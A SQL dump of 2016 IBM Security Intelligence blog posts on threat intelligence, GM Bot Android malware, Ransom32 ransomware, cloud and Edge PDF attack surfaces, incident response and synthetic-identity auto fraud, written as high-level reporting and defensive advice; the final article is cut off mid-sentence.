INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (281, 'Triple Threat: Engaging a Trifecta of Threat Intelligence From IBM X-Force', 'Pamela Cobb', '2016-3-14', 'IBM has had a lot of news lately in the   world, with new capabilities and new acquisitions. What excites me, however, is the organic growth and extension of X-Force into  . Back when X-Force was founded, researchers were focused on specific topics like vulnerabilities. As the group has evolved, so has the breadth of coverage, which now includes spam, Web applications, botnet analysis, malware, mobile research and fraud campaigns. It’s an exciting time when the IBM X-Force name also stands for applied expertise directly to our clients through actual on-site engagements. X-Force is a busy group of people that could not accomplish what it does without a substantive quantity of data — whether it’s the sizable vulnerability database, 25 billion URLs and images, 860,000 IP addresses, 270 million endpoints or even the 15 billion security events a year from our managed security services clients. That is literally more data can you can shake a USB stick at, and we have   to prove it. Before the advent of  , that data was housed in corners of the organization, where you could get to it if you knew the right person or the right website. With the openness of X-Force Exchange, however, anyone — whether they are an IBMer or a client or even a fellow security provider — is welcome to research, inquire and collaborate with the wealth of machine-generated intelligence. The collaboration of users within X-Force Exchange adds human context to threat intelligence to further refine the value of the data, particularly as X-Force practitioners, from researchers in the lab to those deployed on client sites, contribute insights and commentary on the threat observables in the platform. Long before X-Force Exchange was available, X-Force expertise was worked into a variety of products such as  , security intelligence and more. Threat intelligence is the foundation of and refining quality for a range of solutions. Whether it’s automatic blocking rules in a network protection product, securing cloud applications for employee use or refining prioritization of security events to prioritize investigations, the value of additional threat intelligence is clear. Insight from X-Force permeates IBM Security as possibly the     ever. Until last year, these insights were distributed via our products and in published reports and various speaking events, but not on an as-needed or on-call basis. That began to change in X-Force Exchange as researchers (as noted with a blue bar on their avatar) posted publicly and created collections focused on emerging threats and original research. With the advent of X-Force Incident Response, that same expertise can now come to you when you need it. Whether you are experiencing a breach or developing response plans to prepare for the worst, the same discipline that built the foundation of threat intelligence that saturates IBM Security is now available with a phone call. The combination of threat intelligence and applied insights is a dynamic duo, but the additional capability of making it actionable makes X-Force a triple threat.', '\'IBM X-Force Exchange\', \'IBM X-Force Incident Response and Intelligence Services\', \'Incident Response (IR)\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/triple-threat-engaging-a-trifecta-of-threat-intelligence-from-ibm-x-force/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (282, 'Mobile Malware GM Bot v2 Released, Price Triples', 'Limor Kessem', '2016-3-11', 'After news from IBM X-Force about the  , the author of GM Bot released a second version of the malware. News of v2 came from the official GM Bot developer and vendor, a user going by the alias GanjaMan in venues where the malware is sold. According to an underground forum post authored by GM Bot’s vendor, it took six months’ worth of work for this updated version of GM Bot. GanjaMan adds that v2 was “written from scratch,” perhaps in order to emphasize that it does not use the previous version’s code, which was recently leaked by one of its dubious customers. An interesting point mentioned by the post’s author is his claim that he has incorporated three different Android OS exploits for infecting user devices. At this time, the exploits the vendor mentions are known and have patches, so fully up-to-date devices should be protected against such vulnerabilities. However, according to the post, additional exploits are being examined and will be added in the coming months. The developer also promises a future option to open a   communication channel from infected devices and having root admin control that cannot ever be undone by the user. Building malware that roots the infected device can allow an attacker to download additional malware into the device and control it remotely. The new mobile malware is apparently a testing phase of sorts at this time, but early adopters are not getting a discount. The malware developer offers a $15,000 package for the malware and exploits, plus an ongoing $2,000 rental fee starting from the second month onward. Those who wish to skip the exploits pack can opt for the malware-only package at $8,000, plus a $1,200 monthly rental fee from the second month on. The price has tripled compared to the $5,000 price tag for the previous version. Malware pricing with monthly fees in tow are reminiscent of the sale model of major  , SpyEye and Citadel, when those kits were peddled by their developers a few years back. Judging by past cases of underground malware vendors, the monthly rental fees are most likely technical support fees. Trojan vendors have been known to run into debilitating operational issues as a result of having to provide support to their buyers without getting paid for the extra time spent on resolving issues, bugs and technical questions. The monthly fee concept helps the developers hire tech support agents to handle requests while they continue to develop and sell the malware. On top of recruiting customers, as he puts it, GanjaMan is also seeking professional pay-per-install accomplices and cybercriminals who can help with directing Web traffic in countries his buyers would be interested in targeting. It is not surprising to see a malware developer openly calling on accomplices to partner with as part of the infection chain. The installs market, where individuals can be paid for each successful malware installation they facilitate, has always been part of the cybercrime supply chain. In many cases, fraudsters who specialize in black-hat search engine optimization (SEO), spam botnets, exploit kits, adware, malicious Web toolbars and/or malicious landing pages sell installation services to other criminals in Dark Web forums or through an underground e-commerce website. The developer who goes by the GanjaMan alias appears to have been authoring and selling different pieces of Android malware in the underground for about two years at the time of this writing. Overlay spyware like GM Bot is designed to plaster fake message windows on top of banking and payment apps to phish credentials, payment card details, VBV/MSC codes and user PII. This alone makes overlay malware dangerous. But beyond the phishing capability, GM Bot’s spyware features enable a remote attacker to steal transaction authorization codes sent via SMS, exfiltrate device information, intercept or forward incoming phone calls, initiate calls and even lock the device’s screen. The first malware product released by this actor, GM Bot v1, was advertised in underground fraud boards in October 2014. At the time, GM Bot was the only commercial mix of spyware, a SMS hijacking tool and overlay-type malware to be offered to cybercriminals in the Dark Web. According to X-Force researchers who follow the evolution of mobile malware in the underground, the distribution rights to the malware were sold to another developer, who in turn changed its name to  . That actor continues to sell and develop it under that name. In March 2015, the original GM Bot developer released his next malicious offering, this time naming it Skunk. The malware, which is most likely what’s known as GM Bot today, was designed to be an overlay Trojan that dynamically pulls HTML/JS screens from a remote server in real time. While it cannot modify its target apps on the fly, the dynamic ability to get new overlay screens from a remote server made the malware more flexible than any other similar option that had to include or hard-code static images into its files. Another offering from this developer was GM Loader, a malware downloader designed to help criminals fetch whatever they wish from the mobile devices they infect. This practice is very common in PC Trojans and is especially useful for fraudsters who get paid for each successful installation they facilitate. GM Bot’s code base has been used elsewhere and is associated with other aliases such as SlemBunk, Bankosy and AceCard, all of which refer to the same type of malware. The main differences between these Trojans are the operators who manage them, the infection process and the eventual uses of the stolen data the Trojans exfiltrate to their nefarious owners. With the leak of GM Bot’s source code in December 2015, IBM X-Force researchers expect to see many more variations of this malware and a sharp rise in the number of criminals operating overlay Trojans in the coming months. IBM Security has worked with customers to study and detect malware like GM Bot. Its security tools and extensive research can be of help to banks and organizations that wish to learn more about this high-risk threat.  in your organization can help keep your users safe from evolving threats such as GM Bot and other overlay malware. With protection layers designed to address the ever-changing threat landscape, organizations from all sectors can benefit from IBM Security’s malware intelligence, which provides real-time insight into fraudster tools, techniques and capabilities.', '\'Android\', \'Android Security\', \'Banking Trojan\', \'GM Bot\', \'IBM X-Force Research\', \'Malware\', \'Mobile Malware\', \'Mobile Security\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/mobile-malware-gm-bot-v2-released-price-triples/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (283, 'Ransomware Takes a Scary Turn Using JavaScript', 'David Strom', '2016-3-8', 'Security researchers have uncovered a new twist on ransomware-as-a-service with the discovery of what is being called  . While there have been several Web-based ransomware variants, including TOX and FAKBEN, this is a somewhat different development since it uses a popular JavaScript framework called NW.js.   first wrote the story in early January. Using JavaScript (JS) framework is a dark turn of events but not completely unexpected. Normally, JS programs run in tight sandboxes in your browser and can’t touch the underlying operating system because you don’t want some ill-behaved JS routine to crash your system. But programmers have built numerous frameworks to try to give more control and interactivity to Web-based routines, and one of the up-and-coming frameworks is NW.js. When using this framework, you have almost as much access to the underlying system resources as a regular C++ program. The routines can look very similar to normal Windows or Mac software. But this also means that malicious actors who write NW.js routines can also have free rein on a system, and that’s where Ransom32 comes into the picture. The ransomware mandates that victims have four days to pay, and after a week, their entire hard drive is destroyed. You can see a more detailed explanation of the threat, along with screenshots, on the  . The issue is that NW.js is a legitimate framework, which makes it even harder for Ransom32 to be added to signature-based malware detection solutions. Malware fighters report that many of them didn’t have great detection coverage for the first few weeks after the software was discovered. Ransomware attacks and related   have grown in number and sophistication in the past year. The earlier ransomware variants took a 10 to 30 percent cut of the proceeds if they were used by criminals, while Ransom32 takes 25 percent, according to Computerworld. After you sign up for the service and give the authors your bitcoin information, you connect to a control panel where you can find out how many people have already paid the ransom or which systems were infected. You can set up how much the ransom is and how many fake messages are sent to the infected users. The software can be easily assembled with just a few mouse clicks; there’s no real programming experience required. Of course, who knows if the information displayed in this control panel is even accurate. So far, Ransom32 has only been observed infecting Windows PCs. But still, given this feature, don’t expect it to stay limited to Windows for very long. It wouldn’t take much for cybercriminals to generate packages for Linux or Macs and expand their target base. Backups are critical for protection against any malware, but especially ransomware that could destroy your entire hard drive. So this means actually testing restores regularly to ensure that your backup routines are actually working. You should increase your efforts in phishing   so that users avoid downloading and installing this nasty bit of code inadvertently. We know that everything-as-a-service is happening, especially with regard to malware construction kits. But with the popularity and profit behind ransomware, it is sad to see this latest step in its evolution.', '\'Advanced Threats\', \'JavaScript\', \'Malware\', \'Ransomware\'', 'https://securityintelligence.com/ransomware-takes-a-scary-turn-using-javascript/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (284, 'Peanut Butter and Chocolate and IBM X-Force', 'Pamela Cobb', '2016-3-4', 'I had the pleasure of attending the   in February, and my colleagues like to make fun of the fact that I plan my hotel stay so I strategically walk by a certain chocolate megastore on the Vegas Strip on my way to the conference. My passion for highlighting the great security research from IBM X-Force rivals my love of the combination of chocolate and peanut butter, so it’s a bonus I get to combine the two things at the InterConnect conference.\n In 2015, we started integrating security research publications across the IBM Security division under the IBM X-Force name. After all, for over 20 years, the X-Force brand has stood for expert analysis and threat intelligence to educate and better protect clients. It’s with excitement that we are offering a two-part webinar series to highlight the latest trend research being published.\n The upcoming “ ” series will, at a macro level, discuss the recently released “ ,” highlighting trends on cybercrime, emerging attack types and how breaches of durable personally identifiable information (PII) are offering attackers inroads to corporate networks.\n Later in the month, we invite you to take a deep dive on the 2016 IBM X-Force Cyber Security Intelligence Index, which examines the major threats that IBM’s own Security Services clients faced in 2015. This will help you better understand the current threat landscape by offering a detailed look at the volume of attacks, the industries most affected, the most prevalent types of attacks and attackers and the key factors enabling them.\n In both webinars, experts within IBM X-Force share their insights and recommendations on how to   and valuable digital assets. While financial gain is still a significant motivator for cybercriminals, it’s by no means the only one, as we see in both the macro industry trends and within our own client base.\n Last year’s attackers branched out in a big way, inflicting physical damage and pilfering intellectual property and sensitive personal data, which they can, in turn, use to further infiltrate even bigger financial targets through social engineering.\n Having these two publications under the   brand brings two great things together: the macro and micro look at the latest trends and the details on how they are affecting companies like yours.', '\'IBM InterConnect\', \'IBM X-Force Research\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/peanut-butter-and-chocolate-and-ibm-x-force/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (285, 'Security Challenges in the Cloud Environment', 'Brad Harris', '2016-3-3', 'Clouds are everywhere these days. They are often cheaper, more powerful, compatible with single sign-on (SSO) and often accessible via a Web browser. There are four main types of clouds: on-premises, or clouds hosted by the customer; off-premises, or clouds hosted by a vendor; dedicated, which are clouds used only for a particular tenant; and shared, a cloud where resources are spread among many tenants. These categories are more descriptive than public and private clouds. There are also virtual machine-based clouds where several separate computing environments can be used, versus bare-metal, where each compute node is a separate physical machine. The first and most dangerous threat in any IT system is the insider threat. It’s especially hard to defend against because users, and particularly administrators, have usually been granted some degree of trust. Technological countermeasures can usually be circumvented if the user has the right level of access. This is why it is critical for organizations to have an efficient offboarding process so that disgruntled released employees do not have access to the systems.  occur when an attacker has the ability to obtain information from another tenant’s node by measuring some side effect of the system’s use. These have been popularized in the research community but, to IBM X-Force’s knowledge, have not been seen in the real world. Perhaps the most dangerous real-world threat is the loss of authority over the cloud control interface. We aren’t talking about the provisioning portal but rather the administrative interface of your enterprise’s cloud. Think of it as a control console for your cloud nodes. \n In the right situation, this can lead to a complete loss of integrity, confidentiality and availability. Note that the attack here is against the interface’s Web server, or a cross-site scripting (XSS) or cross-site request forging (CSRF) attack against the administrator’s Web browser. Make sure the interface’s Web server is up to date and that the interface does not have any XSS or CSRF vulnerabilities. These are just good security practices in general and are not unique to the cloud. If you use SSO, be sure your security assertion markup language (SAML) implementation follows the recommended specification. Additionally, use two-factor authentication. Note that this is good practice for restricting access to any sensitive servers and data. There is a somewhat rare attack called virtual host confusion. It is often seen with content delivery networks and shared  . This attack can allow for server impersonation under the right circumstances. Once again, the X-Force team is not aware of this being exploited in the wild. For more information, read the paper “ .” This attack is from the same group that identified Logjam, FREAK, SLOTH and others. To prevent this attack, never use certificates for more than one domain. Avoid using wildcard certificates and carefully configure TLS caching and ticketing parameters to be different for every Web server. Finally, make sure your domain fallback page is an error page. Shared data and computations on shared (typically off-premises) clouds can be exposed in the right circumstances. This particularly applies to MapReduce operations. To prevent this leakage, consider dedicated clouds, where there is a lesser chance of malicious actors having a presence. Never make the mistake of assuming that on-premises or dedicated clouds need not be secured according to industry best practices. These clouds are often considered a more valuable target by attackers. Finally, there is shadow IT, or the inability of IT to monitor the activities of the user. This happens when the user’s client is connected to a cloud with an encrypted connection. In that case, the user can interact with the cloud and perhaps perform unauthorized actions. To combat this, consider federating. Monitor your logs to see which applications are in use and use a proxy to intercept cloud traffic. You can also use an analytics engine and create relevant rules at your endpoint device. In general, what can be done to improve  ? Always follow the best security practices whether you are a tenant or a provider, such as tracking new vulnerabilities and attacks against components of your cloud. If you are a cloud provider, do background research on entities that wish to join your environment. If you are a tenant, always understand your cloud model and compensate for any weaknesses inherent in that type. Be sure to support TLS 1.2 access. This ensures stronger cryptography and is the latest secure protocol for connections to Web servers. Both providers and tenants should institute regular vulnerability scanning as frequently as is feasible. They should also lock IP addresses so only authorized networks are able to access your cloud or site. If this is not possible as a provider, then be sure to employ strong authentication and access controls. As a provider, make logs relevant to your tenants available. This complements the tenant’s own logging. As a tenant, make sure all software is up to date. PaaS providers need to do the same with their environments. In one of the most important measures, tenants must encrypt data. This is critical for data protection, but be sure to implement cryptography correctly. There are solutions available to minimize the ciphertext deduplication problem.', '\'Cloud\', \'Cloud Infrastructure\', \'Cloud Security\', \'Vulnerabilities\', \'X-Force\'', 'https://securityintelligence.com/security-challenges-in-the-cloud-environment/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (286, 'WinRT PDF: A Potential Route for Attacking Edge', 'Mark Yason', '2016-3-2', 'At this week’s  , I will be presenting my research on the attack surface and exploit mitigations in EdgeHTML, the rendering engine used by the Edge browser on Windows 10. One of the interesting features of EdgeHTML that I will discuss is its ability to use the built-in WinRT PDF Renderer library in Windows for rendering PDFs.\n The feature is useful in that users do not need to install and maintain additional software for reading PDFs. However, the feature also opens up another attack surface that can be used to attack the Edge browser. This blog post takes a look at this library and its security implications.\n The built-in WinRT PDF Renderer library in Windows (discussed here as WinRT PDF) is part of the Windows Runtime (WinRT) and was first introduced in Windows 8.1. It   to make it easier for developers to incorporate the rendering of PDFs in their Windows Store applications.\n The PDF engine in WinRT PDF can be traced back to Windows 8.   noted that it is also the PDF engine used in the Reader App in Windows 8 and later in Windows 8.1.\n WinRT libraries such as WinRT PDF have well-documented APIs that applications can use. In the case of WinRT PDF, the   provides the necessary classes that would allow applications to render PDFs into image files. Interestingly, in addition to using the documented WinRT PDF APIs, EdgeHTML uses additional, nondocumented WinRT PDF APIs that enable features such as PDF text searching and selection.\n Under the hood, EdgeHTML uses its   class for interfacing with WinRT PDF.   retrieves the   for the following WinRT PDF classes, which it then uses to instantiate the necessary classes used for loading, rendering and performing various operations on a PDF file:\n \n Note that unlike COM class factories that are retrieved via  , WinRT activation factories are instead retrieved via a call to  . Also, in EdgeHTML, the   helper function is used as a wrapper for calling  .\n Of the three WinRT PDF classes, only the   class is  . It is the main class that uses the PDF engine to load and parse the PDF file.   is a thin wrapper used to pass a URL and a progress handler that will be used in the PDF loading operation.   is used for rendering the PDF and handling window messages destined to the rendered PDF, in addition to features such as PDF text searching and selection.\n On the EdgeHTML side,   additionally instantiates a few more classes:   is used by WinRT PDF for sending messages to or retrieving information from EdgeHTML.   acts as an internal HTML element that holds the rendered PDF, and if necessary, it relays the window messages it receives to  .\n Finally,   is instantiated when performing text search operations. It uses   for the actual search operation.\n WinRT PDF moved into the spotlight with Windows 10 because it was used by the Edge browser for rendering PDFs. From an attacker’s perspective, the direct accessibility of WinRT PDF via Edge means that   can now be used in drive-by attacks against users.\n As an example, a JavaScript code in the Web page shown below injected a 25×25 embed element that references a PDF file. The referenced PDF file is rendered by WinRT PDF, which is then manifested by the small 25×25 square block below the text:\n \n If the PDF file contains an exploit for a WinRT PDF vulnerability, the user is unlikely to notice that the drive-by attack is occurring. Furthermore, since Edge is also the default PDF reader in Windows 10, additional attack vectors for exploitation such as email attachments would also apply.\n PDF rendering using WinRT PDF is enabled by default in Edge, and as of this writing, there is no option to disable it in the user interface. Furthermore, since WinRT PDF is a library, other applications that use it for PDF rendering are also potential vectors for exploitation.\n A major factor that will affect when and how often we see in-the-wild exploits for WinRT PDF vulnerabilities depends on how difficult it is to exploit them. In Edge, WinRT PDF runs in the context of the Edge content process; this means that mitigations applied to the Edge content process such as ASLR (with high entropy and force ASLR enabled), DEP and the   process isolation mechanism also apply to WinRT PDF. On 64-bit Windows installations, WinRT PDF also runs in the context of a 64-bit process where ASLR is more effective.\n Furthermore, WinRT PDF is compiled with   enabled — a recently introduced exploit mitigation that breaks common exploitation techniques. The combination of these mitigations makes the development of exploits for WinRT PDF vulnerabilities time-consuming and therefore costly for an attacker.\n WinRT PDF opens up an additional attack surface that can be leveraged to attack the Edge browser. But for now, exploiting WinRT PDF via Edge is expensive because of the combined exploit mitigations in place. Interest in WinRT PDF and the development of new exploitation techniques will determine when an Edge drive-by exploit leveraging a WinRT PDF vulnerability will be seen in the wild.', '\'IBM X-Force Research\', \'Microsoft Edge\', \'RSA\', \'RSA Conference 2016\', \'Vulnerability\', \'Windows\', \'Windows 10\', \'X-Force\'', 'https://securityintelligence.com/winrt-pdf-a-potential-route-for-attacking-edge/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (287, 'IBM Security Announces New Incident Response Capabilities', 'Marc van Zadelhoff', '2016-2-29', 'When it comes to emergencies such as fires, snowstorms or chemical spills, organizations have well-planned responses that are documented step by step and shared — even practiced — with employees. However, when it comes to cyberattacks, which can be equally destructive, few organizations have an automated, coordinated response. According to a study from the  , 70 percent of U.S. security executives do not have a cybersecurity incident response plan in place. With the average cost of a data breach now totaling $3.8 million (according to a separate  ), the risk of exposure is great. Today, IBM made a series of announcements, including the planned  , that will aim to provide organizations with a proactive, comprehensive approach to respond to cyber breaches more quickly and effectively across consulting, services and products. With  , a leader in incident response, IBM will be in a position to provide the industry’s first integrated end-to-end Security Operations and Response Platform offering that spans the entire life cycle of an attack, from protection and detection to response. The combination of   with QRadar Security Intelligence Incident Forensics has the potential to deliver something incredibly powerful. With the enhanced analytics capabilities that allow QRadar to continuously search through billions of events each day, looking for abnormal behaviors and feeding that data to Resilient Systems, we will be able to proactively orchestrate a process to tackle a security incident that spans organizational and product boundaries.  provides a broad set of response playbooks for different incident types, tapping into its knowledge base of global regulatory requirements and compliance actions to provide information and tools for responding to a range of incidents. This enables users across the organization to collaborate in the response process and access data from more than a dozen cyberthreat intelligence feeds as well as other integrated cybersecurity and IT systems — including  , one of the largest threat intelligence databases in the world. IBM’s investment in incident response also extends to our IBM Security consulting and managed services with the launch of our new  , which is designed to help clients manage the myriad aspects of responding to a cyber breach. IBM X-Force security experts will help clients develop response strategies, including Computer Incident Response Team playbooks, to more effectively discover, track, respond to and report on security incidents. Also included is a new remote incident response service that actively hunts for threats and allows for the remote management of active attacks via the cloud. Working with  , whose incident response products enable security analysts to monitor cyberattacks from the endpoint, will further enhance IBM’s response capabilities. Breaches are not going away. Every day, another enterprise is compromised with new and more damaging attacks coming from cybercriminals. By uniting these two powerful capabilities, IBM and Resilient Systems aims to give organizations confidence that they can identify a threat and kick off a targeted response drill in 30 minutes rather than managing a crisis six to 12 months down the road.', '\'Resilient Systems\', \'Security Intelligence\', \'X-Force\'', 'https://securityintelligence.com/ibm-security-announces-new-incident-response-capabilities/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (288, 'Response: The Key to Cyber Resilience', 'John Bruce', '2016-2-29', 'Good security is a combination of prevention, detection and response — robust, resilient, responsive. Five years ago, that simple statement was novel. There were no purpose-built technologies that armed security teams with the capabilities needed to instruct, orchestrate and automate the incident response process. So there began Resilient Systems’ mission: to empower organizations to thrive in the face of cyberattacks and business crises. We built the industry’s first Incident Response Platform (IRP). Now in version 25, it seamlessly connects with the myriad of security tools used by organizations today, creating an intelligent   hub. It brings together people, processes and technology with the potency and intelligence needed to fight today’s cyber battles. Having pioneered this nascent market, today, we’re delighted to announce our intention to become part of the world’s fastest-growing enterprise security company, IBM Security. Once the acquisition is closed, the market will have leading prevention, detection and response technologies available in a single portfolio — the security trifecta. Simply put, it helps customers transform their security posture. We’ve found that organizations with capable response have greater cyber resilience. IBM Security General Manager   referred to the   we sponsored in 2015 that showed U.S. organizations were lacking response planning and preparedness while struggling for greater resilience. We recently released similar studies for the   and  . Like the U.S. study, these new reports show that there are clear global trends of insufficient planning, lack of collaboration and lack of focus on building capable response. Combining our knowledge and expertise with IBM is a perfect fit culturally and technologically. We’re already integrated with IBM QRadar and IBM App Exchange in production environments, and the   and extend it into other IBM technologies makes for a compelling solution for our joint customers. Our mission continues, but now at a level that we couldn’t possibly have accomplished on our own. We’re very excited for what’s in store for our employees, customers and partners.', '\'IBM Security\', \'Incident Response (IR)\', \'Resilient Systems\', \'Security Intelligence\'', 'https://securityintelligence.com/response-the-key-to-cyber-resilience/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (289, 'Three Ways to Reduce the Impact of a Breach', 'Dan Wilson', '2016-2-29', 'Having been in the IT security industry and incident response for over 15 years, I have seen my fair share of security breaches, and I’ve experienced firsthand the effect these events can have on individuals and businesses. Damaged careers and brand reputations, as well as the high costs of dealing with the incidents, can be staggering to any business. With security incidents continuing to increase in number and complexity and the   reaching a record high in 2015, it is no wonder that many security professionals lay awake at night wondering if they have the right strategy in place to protect their business. It has become obvious that having a security compliance program with the latest security technology in place is just not enough. It is no longer a matter of if an organization will experience a security incident of some kind, but when. Given that it is more likely to happen, organizations should be focusing on incorporating proactive incident response strategies that will reduce the overall impact of an incident into their security program. Here are three ways   can help an organization to be better prepared for the inevitable. Research has shown that an organization that assumes the mentality that security incidents will occur and works to prepare for those events will deal with the incidents more effectively. This will lead to a reduction in organizational churn and the associated costs of dealing with a security incident. In other words, “Chance favors the prepared mind.” A well-thought-out incident response plan that has been tested and reviewed with key stakeholders is a critical part of this preparation. Having the appropriate   on board is also an important factor. But time and budget, or hiring the right skills in a depleted market, can make this difficult and may feel like a daunting task to conquer on your own. However, IBM X-Force Incident Response can help you reduce the overall impact and risk for your organization with industry-leading incident response expertise. IBM X-Force assigns professionals to work with you proactively in your incident response program. Our experts will: So how exactly does all that help? Here is an example of a recent client that purchased our service a year ago and was struggling with the challenges of managing incident response for a large global footprint with a small corporate security staff. We began our partnership by developing a custom security incident response plan that defined roles within the organization, helped meet required compliance and regulatory needs and defined severity levels outlining when various organizational elements needed to be involved. The plan was approved and then tested with key stakeholders to ensure it would work as designed. Education was then provided and the plan implemented. With the plan in place, the client had IBM X-Force Incident Response on board for assistance when security incidents occurred. This client had to handle several incidents over the past year. In each case, the time to reach containment was cut in half, and the time to provide analysis and recommendations to the client’s C-level also decreased. Overall, organizational churn and costs have been reduced as incidents are handled efficiently with the appropriate level of expertise. All of this was accomplished at a much lower cost than if the client had taken on the project alone and staffed its own forensics expertise. In today’s world of incident response,  . Sometimes you have to go on the offensive. In other words, incident response is no longer just about reacting to security events; it’s about proactively reducing an organization’s risk. Many security professionals and CISOs lay awake at night wondering if the policies and technologies implemented in their defensive plan are truly working. A question often heard is: “Am I already breached or infected and just don’t know it?” IBM’s X-Force Incident Response team can help answer that question. With our experience and in-depth knowledge of security intelligence and attack vectors, we work with clients to deploy forensics expertise that proactively searches their IT environment for any undetected malicious activity. Anything outside the norm is quickly identified and eradicated before it can become a larger problem. IBM X-Force Incident Response has done many of these assessments with clients over the past couple years. In most cases, malware and other malicious activity has been discovered and dealt with. At the very least, clients received a list of actions they can take to shore up their environment and better prevent future attacks. Other clients take advantage of our capability to proactively review the network of any newly acquired entities before proceeding with integration into a corporate network. This allows the client to ensure anything malicious that already exists is removed and the environment hardened prior to integration. Considering we have seen many large breach cases start with an insecure acquisition being tied to the home network, this gives the client a proactive and secure approach to network integration. Implementing a new security technology and trusting that it works as advertised assumes a large risk for your organization. Testing of the implementation and making adjustments should be done regularly. IBM’s X-Force Incident Response team can also assist with this. By combining incident response expertise with penetration testing and security information and event management (SIEM) consulting expertise, we can plan and conduct real-life testing exercises designed to test your implementation against the latest threats. We then work with you to fine-tune your SIEM implementation to reduce the noise and increase alerting on the things that matter. At the end of the day, success in reducing the risk and costs for your organization when dealing with security events depends on the proactive approach your organization takes with its own incident response strategy. Partnering with IBM X-Force Incident Response can ensure you have: IBM X-Force Incident Response is a winning relationship for any security leader looking to be proactive. Professionals can rest easy knowing they have a full partner in their incident response.', '\'IBM X-Force Incident Response and Intelligence Services\', \'Incident Response (IR)\', \'X-Force\'', 'https://securityintelligence.com/three-ways-to-reduce-the-impact-of-a-breach/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (290, 'IBM Red Cell Research: Vehicle Buy-and-Ship Fraud Schemes Use Synthetic Identities', 'Steven D\'Alfonso', '2016-2-26', 'Synthetic identity fraud has been a growing a problem for years. IBM Red Cell has been writing about   and   for the last 18 months. Organized crime groups (OCGs) leverage synthetic identities to commit various fraud schemes. Vehicle buy-and-ship schemes use synthetic identities to finance purchases from new and used car dealers, which allows OCGs to reap huge financial gains with little to no risk.   proclaimed synthetic identities as one of the top three risks facing financial institutions in 2016. Auto finance fraud is not a new phenomenon; OCGs have successfully stolen vehicles using straw buyers and identity theft for years. In the past, OCGs would target individuals to lend their Social Security numbers and credit ratings to act as straw buyers for new and used cars. Often, the straw buyer would claim identity theft for the purchase of the vehicle after it was shipped out of the country. From the criminal’s point of view, a straw buyer leaves a potential trace or connection. The beauty of synthetic identities is that there is no one behind that identity to question or to track — the synthetic identity is a ghost. In essence, OCGs are able to eliminate the middleman and interact with the dealer directly. Synthetic identities are created using real and fictitious data to form an identity that, for all intents and purposes, looks legitimate. Synthetic identities can be created by the OCG or purchased in Dark Web marketplaces. IBM Red Cell has written extensively about how synthetic identities are created and co-wrote a   concerning the evolution and implications associated with them. OCGs are able to exploit weaknesses in credit reporting to use a synthetic ID to acquire financing for the purchase of vehicles at multiple dealers throughout the same day. A fraudster using a synthetic ID can go from dealer to dealer in one day and apply for credit without each dealer knowing about previous or same-day inquiries. Often, communication with the dealer and the purchase of the vehicle will take place over the Internet. Fraudsters commonly exploit technology and conveniences designed to   to further their criminal schemes. An increasingly large percentage of consumers prefer to shop for vehicles via the Internet to avoid the unpleasantness of interacting with the dealer in person. This newer and acceptable way of buying autos makes it easier for fraudsters to successfully carry out the scheme. Upon purchase completion, the fraudster will often have the vehicle shipped to a location, sometimes directly to a port, where the vehicle will be signed for. While some dealerships now require the buyer to take possession of the car in person at the dealership, this is a small hurdle that can be easily overcome with fraudulent identification documents. Vehicles are shipped overseas to various countries, with China being a popular destination; certain autos can fetch a price that is three times the value of the car in the U.S. The shipment expense is paid for with a credit card tied to the synthetic ID. Thus, an OCG is able to obtain a vehicle (often a luxury car or SUV) with little or no cost involved. Auto manufacturers and dealers across the U.S. have begun to recognize synthetic identities as a substantial threat. They realize that a significant portion of their credit losses may come from fraud schemes. While they recognize this as a problem, they are struggling to identify an effective solution. Because synthetic identities look and act like any other customer, identification is extremely challenging. Many people point to national credit bureaus to solve the problem, but they, too, have been struggling with the synthetic ID issue. It is important to understand that credit bureaus are data aggregators, not data validators. However, credit bureaus may be a key factor in solving or reducing the problem because of the vast amount of data they hold. Additionally, there are controls that may be added to the underwriting and financing process to limit the issue. Those controls would likely come at the expense of the customer experience, which could potentially hurt sales overall. The ultimate answer will come from input and potential changes to the process in addition to  .', '\'Fraud\', \'Fraud Protection\', \'Identity Fraud\', \'Organized Crime\', \'Red Cell\'', 'https://securityintelligence.com/ibm-red-cell-research-vehicle-buy-and-ship-fraud-schemes-use-synthetic-identities/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (291, '2016 IBM X-Force Report: Breaches Without Borders and Tales From the Cybercrime Underground', 'Leslie Horacek', '2016-2-22', 'Today we released the  . In 2015, organized crime groups really stepped up their game by focusing on higher-value records such as health-related personally identifiable information (PII) and other types of sensitive data to exceed initial forecasts for the year. To say it was an exciting year would be understatement! Cybercrime had an epic year, with criminals chasing opportunities everywhere — and affecting everyone. The demand for leaked data is trending toward higher-value records such as health-related PII and other sensitive data, with less emphasis on the emails, passwords and even credit card data that were the targets of years past. We see this in both the breach trends and the evolution of malware to target high-value bank accounts. \n The top 10 list of malware code listed in the figure below reveals that cybercrime is no longer the domain of amateurs. While lone attackers and small factions continue to use the   for their fraud attempts, the more impactful cybercrime is without a doubt the domain of organized gangs. News of breaches are being reported more widely around the world. This is reflected not only in the volume of incidents reported publicly, but also new government regulations requiring disclosure, such as those the Netherlands has implemented. In 2015, there were notable breaches reported in Canada, Australia, the U.K., France, Turkey and Japan. Malware, too, has continued to move around the globe, with   jumping from Japan to the U.K., and Dyre making appearances in Spain and Australia. In the report, we talk more about these leaps and others as being indicative of the increasing sophistication and organization of attackers since they require more than simple changes to configuration files. In the 